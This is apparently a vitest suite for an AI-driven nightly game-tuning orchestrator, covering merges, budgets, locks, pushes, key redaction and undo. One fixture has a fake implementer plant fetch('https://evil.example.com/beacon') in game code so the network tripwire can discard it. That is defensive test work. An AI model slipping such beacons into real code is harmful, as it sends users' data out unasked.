// The run orchestrator and undo against a real temp git repo with a bare temp "origin". Claude, the play checks, ci:local
// and the candidate checks are fakes; the candidate pipeline itself is the real runCandidate (checks unsandboxed via the
// tests-only flag, except where a test proves the real path refuses without the sandbox).
import { execFileSync, spawn, spawnSync, type ChildProcess } from 'node:child_process';
import { EventEmitter } from 'node:events';
import { existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { homedir, tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { dayOf, formatTrailers, parseTrailers, type ScoreReport, type SpendDay, type Ticket } from '@studio/core/hal';
import { secretReadPaths } from './env.js';
import type { CheckCommands } from './candidate.js';
import { runClaude, type ClaudeCall, type ClaudeResult } from './claude.js';
import { ensureMainWorktree, HAL_MAIN, runGit, type GitRunner } from './git.js';
import { acquireLock, defaultStartTime, lockLive, runNight, undoCommand, type RunDeps, type RunOptions, type RunReport } from './run.js';
import { parseRunArgs, realRunDeps, runRunCommand } from './cli-run.js';
import { redactor } from './run-util.js';
import { killLiveGroups, runIsolated, sandboxAvailable } from './sandbox.js';

const KEY = 'sk-ant-test-FAKE0123456789';
const NOW = new Date('2026-11-12T03:00:00Z'); // night 2026-11-11 at tz offset 0
const NIGHT = '2026-11-11';
const gitIn = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8' }).trim();
const put = (root: string, rel: string, data: string | Buffer) => { mkdirSync(dirname(join(root, rel)), { recursive: true }); writeFileSync(join(root, rel), data); };
const read = (root: string, rel: string) => readFileSync(join(root, rel), 'utf8');
const J = (v: unknown) => JSON.stringify(v);
const node = (code: string) => [process.execPath, '-e', code];
const result = (v: unknown, extra = '') => node(`${extra};console.log('HAL-RESULT ' + process.env.HAL_CHECK_NONCE + ' ' + ${J(J(v))})`);
const fakeJpeg = (w: number, h: number) => Buffer.concat([
  Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x04, 0x4a, 0x46]),
  Buffer.from([0xff, 0xc0, 0x00, 0x0b, 0x08, h >> 8, h & 0xff, w >> 8, w & 0xff, 0x01, 0x01, 0x11, 0x00]),
  Buffer.from([0xff, 0xd9]),
]);
const writeJpeg = (out: string) => `const fs=require('fs'),p=require('path');fs.mkdirSync(p.dirname(${J(out)}),{recursive:true});fs.writeFileSync(${J(out)},Buffer.from(${J(fakeJpeg(390, 844).toString('hex'))},'hex'))`;

const GAME = (slug: string, version: string) => ({
  [`games/${slug}/game.yaml`]: `slug: ${slug}\ntitle: ${slug}\nversion: ${version}\nageRating: null\n`,
  [`games/${slug}/index.html`]: `<!doctype html>\n<script type="module">\nimport { createStudio } from '../sdk/studio-sdk.js';\nconst studio = createStudio({ game: '${slug}', version: '${version}', endpoint: '' });\n</script>\n`,
  [`games/${slug}/CHANGELOG.md`]: `# ${slug} changelog\n\nNewest first.\n\n## ${version} (2026-11-10)\n- First release.\n`,
  [`games/${slug}/game.js`]: `export const speed = 1;\n`,
});
const report = (game: string, fitness: number, measures: Record<string, number>): ScoreReport<unknown> => ({ game, levels: [], measures, fitness, hardFailures: [] });
const BEFORE: Record<string, ScoreReport<unknown>> = { hyperline: report('hyperline', 60, { flow: 60, fair: 70 }) };
const ok = (text: string, costUsd: number | null = 0.5): ClaudeResult => ({ ok: true, text, costUsd, subtype: 'success', limitHit: false, timedOut: false, stderrTail: '' });
const IMPL_OUT = (summary = 'Tuned speed.') => `Done.\n{"changelog": "Jumps feel smoother.", "summary": ${J(summary)}}`;

const T = (id: string, title: string, over: Partial<Ticket> = {}): Ticket => ({ id, game: 'hyperline', kind: 'tuning', title, why: 'Players miss the second jump.', ...over });
const GOOD = T('T1', 'Smoother jumps');
const TRIP = T('T2', 'Phone home');
const THIRD = T('T3', 'Brighter trail', { kind: 'polish' });

const passing: CheckCommands = {
  test: () => [node('console.log("green")')],
  typecheck: () => [node('')],
  score: (_d, s) => result({ ...BEFORE[s]!, fitness: BEFORE[s]!.fitness + 1 }),
  screens: (_d, game) => result({ game, shots: [], errors: [], reached: true, notes: [], blockedRequests: [] }),
  controls: (_d, game) => result([{ game, check: 'tap', ok: true, detail: '' }]),
  shoot: (_d, _g, out) => result({ ok: true }, writeJpeg(out)),
};

let repo: string, origin: string, halDir: string, logs: string[];
let calls: ClaudeCall[];

beforeEach(() => {
  const root = realpathSync(mkdtempSync(join(tmpdir(), 'hal-run-')));
  origin = join(root, 'origin.git');
  repo = join(root, 'repo');
  gitIn(root, 'init', '-q', '--bare', '-b', 'main', origin);
  mkdirSync(repo);
  gitIn(repo, 'init', '-q', '-b', 'main');
  for (const [k, v] of [['user.name', 't'], ['user.email', 't@t'], ['commit.gpgsign', 'false']]) gitIn(repo, 'config', k!, v!);
  put(repo, '.gitignore', 'node_modules/\n.data/\n*.log\n.hal.env\n');
  put(repo, 'package.json', '{"name":"x"}\n');
  for (const [p, t] of Object.entries(GAME('hyperline', '0.3.1'))) put(repo, p, t);
  gitIn(repo, 'add', '-A');
  gitIn(repo, 'commit', '-q', '-m', 'base');
  gitIn(repo, 'remote', 'add', 'origin', origin);
  gitIn(repo, 'push', '-q', 'origin', 'main');
  put(repo, 'BRIAN.txt', 'his dirty file\n'); // Brian's checkout: never touched
  halDir = join(repo, '.data', 'hal');
  logs = []; calls = [];
});
afterEach(() => { rmSync(dirname(repo), { recursive: true, force: true }); vi.restoreAllMocks(); });

const halHead = () => gitIn(repo, 'rev-parse', HAL_MAIN);
const originMain = () => gitIn(origin, 'rev-parse', 'refs/heads/main');
const brianMain = () => gitIn(repo, 'rev-parse', 'refs/heads/main');
const readReport = (): RunReport => {
  const latest = JSON.parse(read(halDir, 'latest.json')) as { runId: string; reportMd: string };
  return JSON.parse(readFileSync(join(dirname(latest.reportMd), 'report.json'), 'utf8')) as RunReport;
};
const seedSpend = (usd: number) => {
  const day: SpendDay = { day: dayOf(NOW), calls: usd > 0 ? [{ run: 'earlier', role: 'implementer', billing: 'api', usd, at: NOW.toISOString() }] : [] };
  put(halDir, 'spend.json', J([day]));
};
const spendCalls = () => (JSON.parse(read(halDir, 'spend.json')) as SpendDay[]).find((d) => d.day === dayOf(NOW))!.calls;

type ClaudeOpts = {
  tickets?: Ticket[];
  plannerText?: string;
  costs?: Partial<Record<string, number | null>>;
  implementer?: Record<string, { edit?: (cwd: string) => void; summary?: string }>;
  director?: unknown;
  onCall?: (call: ClaudeCall) => void;
};
const EDITS: Record<string, (cwd: string) => void> = {
  'Smoother jumps': (cwd) => put(cwd, 'games/hyperline/game.js', 'export const speed = 1.2;\n'),
  'Phone home': (cwd) => put(cwd, 'games/hyperline/game.js', "export const speed = 1;\nfetch('https://evil.example.com/beacon');\n"),
  'Brighter trail': (cwd) => put(cwd, 'games/hyperline/game.js', 'export const speed = 1;\nexport const trail = 2;\n'),
};
function fakeClaude(o: ClaudeOpts = {}): RunDeps['claude'] {
  const cost = (k: string, d: number) => (o.costs && Object.hasOwn(o.costs, k) ? o.costs[k]! : d);
  return async (call) => {
    calls.push(call);
    o.onCall?.(call);
    if (call.role === 'planner') return ok(o.plannerText ?? `Here you go:\n${J({ tickets: o.tickets ?? [GOOD] })}`, cost('planner', 0.5));
    if (call.role === 'director') {
      return ok(J(o.director ?? { note: 'A good night for Hyperline.', perGame: { hyperline: 'Hyperline kept its snap.' }, noteReplies: [] }), cost('director', 0.2));
    }
    const title = Object.keys(EDITS).find((t) => call.prompt.includes(t))!;
    (o.implementer?.[title]?.edit ?? EDITS[title]!)(call.cwd);
    return ok(IMPL_OUT(o.implementer?.[title]?.summary), cost(title, 0.5));
  };
}

const fakePlay = (over: Partial<RunDeps['play']> = {}): RunDeps['play'] => ({
  score: async (_dir, s) => BEFORE[s]!,
  screens: async (_dir, game) => ({ game, shots: [], errors: [], reached: true, notes: [], blockedRequests: [] }),
  controls: async (_dir, game) => [{ game, check: 'tap', ok: true, detail: '' }],
  ...over,
});

function deps(over: Partial<RunDeps> = {}): RunDeps {
  return {
    repo, halDir, now: () => NOW, tzOffsetMinutes: 0, model: 'test-model', secrets: [KEY], hasApiKey: true,
    claude: fakeClaude(), play: fakePlay(), ciLocal: async () => ({ ok: true, detail: 'ok' }),
    candidateCtx: { commands: passing, unsandboxedForTests: true, countTests: async () => ({ before: 3, after: 3 }) },
    undoTest: () => [node('')], unsandboxedForTests: true,
    log: (l) => { logs.push(l); },
    proc: Object.assign(new EventEmitter(), { exit: vi.fn() }),
    ...over,
  };
}
const opts = (over: Partial<RunOptions> = {}): RunOptions => ({
  games: ['hyperline'], kinds: [], reportOnly: false, maxTickets: 6, trigger: 'nightly', billing: 'api', push: true, ...over,
});

describe('full fake run', () => {
  it('merges a good ticket, discards a tripwire, skips one on budget; report.json has all three; pushes to origin', async () => {
    // 7.50 left of the $20 cap, 7.00 to slice (R21's 0.50 margin): planner 1.50, then the director's 1.00 is held, so
    // the implementers get 3.00 and 1.50, the third ticket nothing, and the director its 1.00 at the end.
    seedSpend(12.5);
    const brian = brianMain();
    const code = await runNight(opts(), deps({ claude: fakeClaude({ tickets: [GOOD, TRIP, THIRD], costs: { planner: 1.5, 'Smoother jumps': 3, 'Phone home': null, director: null } }) }));
    expect(code).toBe(0);
    const r = readReport();
    expect(r.changes.map((c) => [c.ticket.id, c.verdict])).toEqual([['T1', 'merged'], ['T2', 'discarded'], ['T3', 'skipped']]);
    expect(r.changes[0]!.pass).toBe('HAL-001');
    expect(r.changes[0]!.version).toBe('0.3.2');
    expect(r.changes[1]!.reasons.join('\n')).toMatch(/tripwire network/);
    expect(r.changes[2]!.reasons).toEqual(['budget']);
    expect(r.capReached).toBe(true);
    expect(r).toMatchObject({ night: NIGHT, trigger: 'nightly', billing: 'api', pushed: true });
    expect(r.spend.api).toBe(7); // never past 19.50 for slicing; the report still shows the $20 cap
    expect(Object.keys(r).sort()).toEqual(['billing', 'billingEnded', 'calls', 'capReached', 'changes', 'endedAt', 'games', 'night', 'notes', 'planned', 'pushed', 'runId', 'spend', 'startedAt', 'trigger', 'warnings'].sort());
    expect(r.planned).toEqual([]); // all built or tried
    expect(r.games.hyperline).toMatchObject({ before: { hyperline: 60 }, after: { hyperline: 61 } });
    // R21: the director's $1 was held through the builds, so the note still got written by the director.
    expect(calls.map((c) => [c.role, c.maxBudgetUsd])).toEqual([['planner', 1.5], ['implementer', 3], ['implementer', 1.5], ['director', 1]]);
    const runDir = join(halDir, 'runs', r.runId);
    expect(read(runDir, 'note.md')).toMatch(/A good night for Hyperline/);
    expect(read(runDir, 'report.md')).toContain('the daily API cap is $20.00');
    expect(read(runDir, 'report.md')).toMatch(/HAL-001/);
    // refs/hal/main: the merge, then the history-note commit with Hal-Run; origin's main equals it.
    expect(gitIn(repo, 'log', '-1', '--format=%B', HAL_MAIN)).toMatch(new RegExp(`Hal-Run: ${r.runId}`));
    expect(gitIn(repo, 'show', `${HAL_MAIN}:docs/hal/history/hyperline/${NIGHT}/note.md`)).toMatch(/HAL-001/);
    expect(gitIn(repo, 'rev-list', '--count', `${brian}..${HAL_MAIN}`)).toBe('2');
    expect(originMain()).toBe(halHead());
    expect(brianMain()).toBe(brian);
    expect(read(repo, 'BRIAN.txt')).toBe('his dirty file\n');
    expect(gitIn(repo, 'status', '--porcelain')).toBe('?? BRIAN.txt');
    // Ledger: the two attempts, with their costs (unknown cost = the whole slice).
    const ledger = JSON.parse(read(halDir, 'ledger.json')) as { passes: { id: string; kept: boolean; costUsd: number }[] };
    expect(ledger.passes.map((p) => [p.id, p.kept, p.costUsd])).toEqual([['HAL-001', true, 3], ['HAL-002', false, 1.5]]);
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
    expect(readdirSync(join(halDir, 'wt'))).toEqual(['main']);
  }, 60_000);

  it('the next candidate after a merge starts from the merged scores (no stale baseline)', async () => {
    const two = T('T2b', 'Brighter trail', { kind: 'polish' });
    const code = await runNight(opts(), deps({
      claude: fakeClaude({ tickets: [GOOD, two] }),
      candidateCtx: { commands: { ...passing, score: (_d, s) => result({ ...BEFORE[s]!, fitness: 61 }) }, unsandboxedForTests: true, countTests: async () => ({ before: 3, after: 3 }) },
    }));
    expect(code).toBe(0);
    const r = readReport();
    expect(r.changes.map((c) => c.verdict)).toEqual(['merged', 'merged']);
    expect(r.changes[1]!.scoresBefore.hyperline!.fitness).toBe(61);
  }, 60_000);
});

describe('lock', () => {
  it('a second run while a live pid holds the lock exits 2 with "busy" and touches nothing', async () => {
    put(halDir, 'run.lock', J({ pid: process.pid, runId: 'other', startedAt: new Date().toISOString() }));
    const claude = vi.fn();
    expect(await runNight(opts(), deps({ claude }))).toBe(2);
    expect(logs.join('\n')).toMatch(/busy/);
    expect(claude).not.toHaveBeenCalled();
    expect(JSON.parse(read(halDir, 'run.lock')).runId).toBe('other');
  });
  it('a dead pid\'s lock is taken over; the lock carries pid, runId, startedAt, trigger and the phase, and is removed after', async () => {
    const dead = spawnSync(process.execPath, ['-e', '']).pid!;
    put(halDir, 'run.lock', J({ pid: dead, runId: 'crashed', startedAt: NOW.toISOString() }));
    const seen: unknown[] = [];
    const code = await runNight(opts({ reportOnly: true }), deps({ claude: fakeClaude({ onCall: () => seen.push(JSON.parse(read(halDir, 'run.lock'))) }) }));
    expect(code).toBe(0);
    expect(seen[0]).toMatchObject({ pid: process.pid, trigger: 'nightly', phase: 'plan' });
    expect(typeof (seen[0] as { startedAt: string }).startedAt).toBe('string');
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
  });
  it('acquireLock: second acquire is busy while held; release only removes our own lock', () => {
    const a = acquireLock(halDir, { pid: process.pid, runId: 'a', startedAt: new Date().toISOString() });
    expect('busy' in a).toBe(false);
    const b = acquireLock(halDir, { pid: process.pid, runId: 'b', startedAt: new Date().toISOString() });
    expect('busy' in b && b.busy.runId).toBe('a');
    if (!('busy' in a)) a.release();
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
  });
  it('the lock is removed in finally when a phase throws; the run exits 1 and still writes a report', async () => {
    const failing: GitRunner = async (args, cwd, o) => { if (args.includes('worktree') && args.includes('prune')) throw new Error('git exploded'); return runGit(args, cwd, o); };
    expect(await runNight(opts(), deps({ git: failing }))).toBe(1);
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
    expect(readReport().warnings.join('\n')).toMatch(/git exploded/);
  });
});

describe('stop', () => {
  it('the stop flag (written mid-run) skips the remaining candidates; the note and report are still written', async () => {
    put(halDir, 'stop', 'old flag from yesterday'); // cleared at start
    const code = await runNight(opts(), deps({
      claude: fakeClaude({ tickets: [GOOD, TRIP, THIRD], implementer: { 'Smoother jumps': { edit: (cwd) => { EDITS['Smoother jumps']!(cwd); put(halDir, 'stop', 'now'); } } } }),
    }));
    expect(code).toBe(0);
    const r = readReport();
    expect(r.changes.map((c) => [c.verdict, c.reasons])).toEqual([['merged', []], ['skipped', ['stopped']], ['skipped', ['stopped']]]);
    expect(calls.map((c) => c.role)).toEqual(['planner', 'implementer', 'director']);
    expect(read(join(halDir, 'runs', r.runId), 'note.md')).toContain('A good night for Hyperline.');
    expect(gitIn(repo, 'show', `${HAL_MAIN}:docs/hal/history/hyperline/${NIGHT}/note.md`)).toContain('Hyperline kept its snap.');
  }, 60_000);
  it('`hal stop` writes the stop flag', async () => {
    expect(await runRunCommand('stop', [], { halDir, games: ['hyperline'] })).toBe(0);
    expect(existsSync(join(halDir, 'stop'))).toBe(true);
  });
});

describe('report-only', () => {
  it('plays and plans but never creates a candidate worktree, commits nothing and pushes nothing', async () => {
    const subs: string[][] = [];
    const recording: GitRunner = async (args, cwd, o) => { subs.push(args); return runGit(args, cwd, o); };
    const before = halHead.bind(null);
    const candidate = vi.fn();
    const code = await runNight(opts({ reportOnly: true }), deps({ git: recording, candidate, claude: fakeClaude({ tickets: [GOOD, TRIP] }) }));
    expect(code).toBe(0);
    expect(candidate).not.toHaveBeenCalled();
    const adds = subs.filter((a) => a.includes('worktree') && a.includes('add'));
    expect(adds.every((a) => a.some((x) => x.endsWith(join('wt', 'main'))))).toBe(true);
    expect(subs.some((a) => a.includes('-b') && a.some((x) => x.startsWith('hal/')))).toBe(false);
    expect(readdirSync(join(halDir, 'wt'))).toEqual(['main']);
    expect(gitIn(repo, 'rev-list', '--count', `${brianMain()}..${before()}`)).toBe('0');
    const r = readReport();
    expect(r.changes).toEqual([]);
    expect(r.planned.map((t) => t.id)).toEqual(expect.arrayContaining([GOOD.id]));
    expect(read(join(halDir, 'runs', r.runId), 'report.md')).toMatch(/## Planned, not built\n\n- T1 /);
    expect(calls.map((c) => c.role)).toEqual(['planner', 'director']);
    expect(calls[1]!.prompt).toMatch(/report-only/);
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toBe('--report-only');
    expect(existsSync(join(halDir, 'runs', r.runId, 'play', 'scores.json'))).toBe(true);
  });
  it('a liability ticket without an approval becomes a call; with one it is built', async () => {
    const lia = T('T9', 'Brighter trail', { liability: 'Google Fonts host fonts.googleapis.com' });
    await runNight(opts({ reportOnly: true }), deps({ claude: fakeClaude({ tickets: [lia] }) }));
    expect(readReport().calls.map((c) => c.liability)).toEqual(['Google Fonts host fonts.googleapis.com']);
  });
});

describe('no key anywhere', () => {
  it('after a full fake run that sees the key everywhere, nothing under .data (or the prompts, logs, git) contains it', async () => {
    put(halDir, 'notes.json', J([{ id: 'N-001', at: NOW.toISOString(), game: 'hyperline', text: 'make it zippier', status: 'open' }]));
    const leaky = { ...GOOD, why: `Players miss the jump ${KEY}` };
    const code = await runNight(opts(), deps({
      play: fakePlay({ screens: async (_d, game) => ({ game, shots: [], errors: [`console: token ${KEY}`], reached: true, notes: [], blockedRequests: [] }) }),
      ciLocal: async () => ({ ok: false, detail: `npm test printed ${KEY}` }),
      claude: fakeClaude({
        tickets: [leaky, TRIP], implementer: { 'Smoother jumps': { summary: `used ${KEY}` } },
        director: { note: `Note ${KEY}`, perGame: { hyperline: `Game ${KEY}` }, noteReplies: [{ id: 'N-001', status: 'acted', reply: `Done ${KEY}` }] },
      }),
    }));
    expect(code).toBe(0);
    const hits: string[] = [];
    const walk = (d: string) => {
      for (const e of readdirSync(d, { withFileTypes: true })) {
        const p = join(d, e.name);
        if (e.isSymbolicLink()) continue;
        if (e.isDirectory()) walk(p);
        else if (statSync(p).isFile() && readFileSync(p).includes(KEY)) hits.push(p);
      }
    };
    walk(join(repo, '.data'));
    expect(hits).toEqual([]);
    expect(calls.some((c) => c.prompt.includes(KEY))).toBe(false);
    expect(logs.join('\n')).not.toContain(KEY);
    expect(gitIn(repo, 'log', '-p', HAL_MAIN)).not.toContain(KEY);
    expect(JSON.parse(read(halDir, 'notes.json'))[0]).toMatchObject({ id: 'N-001', status: 'acted', reply: 'Done [REDACTED]' });
  }, 60_000);
  it('redactor walks nested values', () => {
    const r = redactor([KEY]);
    expect(r.deep({ a: [`x${KEY}`], [`k${KEY}`]: { b: KEY } })).toEqual({ a: ['x[REDACTED]'], 'k[REDACTED]': { b: '[REDACTED]' } });
  });
});

describe('push', () => {
  it('a ci:local failure means no push, reported under warnings; refs/hal/main keeps the merge', async () => {
    const before = originMain();
    const ci = vi.fn(async () => ({ ok: false, detail: 'test failed' }));
    await runNight(opts(), deps({ ciLocal: ci }));
    const r = readReport();
    expect(ci).toHaveBeenCalledWith(halHead());
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toMatch(/ci:local/);
    expect(r.warnings.join('\n')).toMatch(/ci:local failed.*test failed/);
    expect(originMain()).toBe(before);
    expect(r.changes[0]!.verdict).toBe('merged');
  }, 60_000);
  it('R22: diverged refs/hal/main and origin/main: the run is forced report-only, nothing built or pushed, recovery steps in a warning', async () => {
    await ensureMainWorktree(repo);
    // Hal is ahead with an unpushed commit, and origin moved on independently.
    const tree = gitIn(repo, 'rev-parse', `${HAL_MAIN}^{tree}`);
    const halOnly = execFileSync('git', ['commit-tree', tree, '-p', halHead(), '-m', 'hal only'], { cwd: repo, encoding: 'utf8' }).trim();
    gitIn(repo, 'update-ref', HAL_MAIN, halOnly);
    const other = join(dirname(repo), 'other');
    gitIn(dirname(repo), 'clone', '-q', origin, other);
    for (const [k, v] of [['user.name', 'o'], ['user.email', 'o@o']]) gitIn(other, 'config', k!, v!);
    put(other, 'OTHER.txt', 'x\n'); gitIn(other, 'add', '-A'); gitIn(other, 'commit', '-q', '-m', 'other'); gitIn(other, 'push', '-q', 'origin', 'main');
    const before = originMain();
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    put(halDir, 'feedback.json', J({ votes: [], undos: [{ pass: 'HAL-001', reason: 'pending', at: NOW.toISOString(), status: 'pending' }] }));
    expect(await runNight(opts(), deps({ ciLocal: ci }))).toBe(0);
    const r = readReport();
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toMatch(/diverged/);
    expect(r.changes).toEqual([]); // nothing built
    expect(calls.map((c) => c.role)).toEqual(['planner', 'director']);
    expect(halHead()).toBe(halOnly); // no merge, no history commit, no undo
    const w = r.warnings.join('\n');
    expect(w).toMatch(/diverged: this run is report-only/);
    expect(w).toContain(`git log origin/main..${HAL_MAIN}`);
    expect(w).toContain(`git update-ref ${HAL_MAIN} origin/main`);
    expect(ci).not.toHaveBeenCalled();
    expect(originMain()).toBe(before);
  }, 60_000);
  it('--no-push keeps the commits local', async () => {
    const before = originMain();
    await runNight(opts({ push: false }), deps());
    const r = readReport();
    expect(r.pushed).toBe(false);
    expect(r.pushSkippedReason).toMatch(/no-push/);
    expect(originMain()).toBe(before);
  }, 60_000);
});

describe('spend under the lock', () => {
  it('records every call before the next one starts; an unknown API cost books the whole slice', async () => {
    seedSpend(0);
    const seen: unknown[] = [];
    await runNight(opts(), deps({
      claude: fakeClaude({ tickets: [GOOD], costs: { planner: null, 'Smoother jumps': 0.75 }, onCall: (call) => seen.push(spendCalls().map((x) => [x.role, x.usd, x.pending ?? false])) }),
    }));
    // During each call: its own reservation (full slice, pending) is already on disk, and every earlier call is settled.
    expect(seen).toEqual([
      [['planner', 1.5, true]],
      [['planner', 1.5, false], ['implementer', 3, true]],
      [['planner', 1.5, false], ['implementer', 0.75, false], ['director', 1, true]],
    ]);
    const c = spendCalls();
    expect(c.map((x) => [x.role, x.billing, x.usd])).toEqual([['planner', 'api', 1.5], ['implementer', 'api', 0.75], ['director', 'api', 0.2]]);
    expect(readReport().spend).toEqual({ api: 2.45, subscription: 0 });
  }, 60_000);
  it('a manual run uses the subscription first and the API for the rest of the run after a limit hit', async () => {
    const limit: ClaudeResult = { ok: false, text: "You've hit your limit", costUsd: null, subtype: 'error', limitHit: true, timedOut: false, stderrTail: '' };
    const claude: RunDeps['claude'] = async (call) => {
      calls.push(call);
      if (call.billing === 'subscription') return limit;
      if (call.role === 'planner') return ok(J({ tickets: [] }), 0.3);
      return ok(J({ note: 'n', perGame: {}, noteReplies: [] }), 0.1);
    };
    await runNight(opts({ trigger: 'manual', billing: 'subscription' }), deps({ claude }));
    expect(calls.map((c) => [c.role, c.billing])).toEqual([['planner', 'subscription'], ['planner', 'api'], ['director', 'api']]);
    expect(readReport()).toMatchObject({ billing: 'subscription', billingEnded: 'api' });
    expect(spendCalls().map((x) => [x.role, x.billing])).toEqual([['planner', 'subscription'], ['planner', 'api'], ['director', 'api']]);
    expect(readReport().warnings.join('\n')).toMatch(/limit/);
  });
  it('API billing with no key runs no Claude call and says so', async () => {
    const claude = vi.fn();
    expect(await runNight(opts(), deps({ claude, hasApiKey: false }))).toBe(0);
    expect(claude).not.toHaveBeenCalled();
    expect(readReport().warnings.join('\n')).toMatch(/no API key/);
  });
});

describe('signals', () => {
  it('SIGINT kills live Claude children and removes the lock', async () => {
    const proc = Object.assign(new EventEmitter(), { exit: vi.fn() });
    let child: ChildProcess | undefined;
    let lockAtExit: boolean | undefined;
    proc.exit.mockImplementation(() => { lockAtExit = existsSync(join(halDir, 'run.lock')); });
    const claude: RunDeps['claude'] = (call) => runClaude({ ...call, billing: 'subscription' }, {
      env: {}, now: Date.now,
      spawn: (_c, _a, o) => { child = spawn('sleep', ['30'], o); setTimeout(() => proc.emit('SIGINT'), 100); return child; },
    });
    await runNight(opts({ reportOnly: true }), deps({ claude, proc }));
    expect(proc.exit).toHaveBeenCalledWith(130);
    expect(lockAtExit).toBe(false);
    expect(child!.signalCode).toBe('SIGKILL');
    expect(proc.listenerCount('SIGINT')).toBe(0); // handlers removed in finally
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
  });
});

// ---- undo ---------------------------------------------------------------------------------------------------------

/** Puts a Hal-style pass commit on refs/hal/main (game.js change + release), like a merged candidate. */
async function makePass(pass = 'HAL-001'): Promise<string> {
  const { dir } = await ensureMainWorktree(repo);
  put(dir, 'games/hyperline/game.js', 'export const speed = 1.2;\n');
  put(dir, 'games/hyperline/game.yaml', read(dir, 'games/hyperline/game.yaml').replace('0.3.1', '0.3.2'));
  put(dir, 'games/hyperline/index.html', read(dir, 'games/hyperline/index.html').replace("'0.3.1'", "'0.3.2'"));
  put(dir, 'games/hyperline/CHANGELOG.md', read(dir, 'games/hyperline/CHANGELOG.md').replace('## 0.3.1', `## 0.3.2 (${NIGHT})\n- Jumps feel smoother.\n\n## 0.3.1`));
  put(dir, `docs/hal/history/hyperline/${NIGHT}/${pass}-before.jpg`, fakeJpeg(390, 844));
  const trailers = formatTrailers({ pass, game: 'hyperline', kind: 'tuning', why: 'Players miss the jump.', scoreBefore: 60, scoreAfter: 61, version: '0.3.2', run: 'run-x' });
  gitIn(dir, 'add', '-A');
  gitIn(dir, 'commit', '-q', '-m', `tuning(hyperline): Smoother jumps\n\nPlayers miss the jump.\n\n${trailers}`);
  gitIn(repo, 'update-ref', HAL_MAIN, gitIn(dir, 'rev-parse', 'HEAD'));
  return halHead();
}
const feedback = () => JSON.parse(read(halDir, 'feedback.json')) as { undos: { pass?: string; status?: string; error?: string; reason: string }[] };

describe('undo', () => {
  it('reverts the pass, writes a NEW patch version with an Undone bullet, commits Hal-Undo/Hal-Reason, records feedback', async () => {
    const passSha = await makePass();
    const brian = brianMain();
    expect(await undoCommand('HAL-001', 'too bouncy', { push: false }, deps())).toBe(0);
    expect(gitIn(repo, 'rev-parse', `${HAL_MAIN}^`)).toBe(passSha);
    const t = parseTrailers(gitIn(repo, 'log', '-1', '--format=%B', HAL_MAIN))!;
    expect(t).toMatchObject({ undo: 'HAL-001', reason: 'too bouncy', version: '0.3.3', game: 'hyperline' });
    const show = (f: string) => gitIn(repo, 'show', `${HAL_MAIN}:games/hyperline/${f}`);
    expect(show('game.js')).toBe('export const speed = 1;');
    expect(show('game.yaml')).toMatch(/^version: 0\.3\.3$/m);
    expect(show('index.html')).toContain("version: '0.3.3'");
    expect(show('CHANGELOG.md')).toMatch(new RegExp(`## 0\\.3\\.3 \\(${NIGHT}\\)\\n- Undone: Smoother jumps \\(HAL-001\\): too bouncy\\n\\n## 0\\.3\\.2 \\(${NIGHT}\\)\\n- Jumps feel smoother\\.`));
    expect(gitIn(repo, 'show', '--stat', '--format=', HAL_MAIN)).not.toMatch(/history/); // the pictures stay as history
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-001', status: 'done', reason: 'too bouncy' })]);
    expect(brianMain()).toBe(brian);
    expect(existsSync(join(halDir, 'run.lock'))).toBe(false);
  });
  it('pushes after ci:local unless --no-push', async () => {
    await makePass();
    const ci = vi.fn(async () => ({ ok: true, detail: '' }));
    expect(await undoCommand('HAL-001', 'too bouncy', { push: true }, deps({ ciLocal: ci }))).toBe(0);
    expect(ci).toHaveBeenCalledWith(halHead());
    expect(originMain()).toBe(halHead());
  });
  it('a conflicting revert changes nothing, exits 1, and is saved to feedback.json for the next run', async () => {
    await makePass();
    const { dir } = await ensureMainWorktree(repo);
    put(dir, 'games/hyperline/game.js', 'export const speed = 1.4;\n');
    gitIn(dir, 'commit', '-q', '-am', 'later change to the same line');
    gitIn(repo, 'update-ref', HAL_MAIN, gitIn(dir, 'rev-parse', 'HEAD'));
    const head = halHead();
    expect(await undoCommand('HAL-001', 'too bouncy', { push: false }, deps())).toBe(1);
    expect(halHead()).toBe(head);
    expect(gitIn(dir, 'status', '--porcelain')).toBe('');
    expect(gitIn(dir, 'rev-parse', 'HEAD')).toBe(head);
    expect(feedback().undos).toEqual([expect.objectContaining({ pass: 'HAL-001', status: 'failed', error: expect.stringMatching(/conflict/) })]);
  });
  it('failing tests change nothing', async () => {
    await makePass();
    const head = halHead();
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ undoTest: () => [node(''), node('process.exit(3)')] }))).toBe(1);
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]).toMatchObject({ status: 'failed', error: expect.stringMatching(/npm test failed/) });
  });
  it('the real path refuses to run the tests without the sandbox', async () => {
    await makePass();
    const head = halHead();
    const plat = Object.getOwnPropertyDescriptor(process, 'platform')!;
    Object.defineProperty(process, 'platform', { value: 'linux' });
    try {
      expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ unsandboxedForTests: false }))).toBe(1);
    } finally { Object.defineProperty(process, 'platform', plat); }
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]!.error).toMatch(/no sandbox/);
  });
  it('a test step that edits the tree fails the undo before the next step (tamper guard)', async () => {
    await makePass();
    const head = halHead();
    const tamper = node(`require('fs').writeFileSync('games/hyperline/game.js', 'export const speed = 9;\\n')`);
    expect(await undoCommand('HAL-001', 'r', { push: false }, deps({ undoTest: () => [tamper, node('')] }))).toBe(1);
    expect(halHead()).toBe(head);
    expect(feedback().undos[0]!.error).toMatch(/changed while the tests ran/);
  });
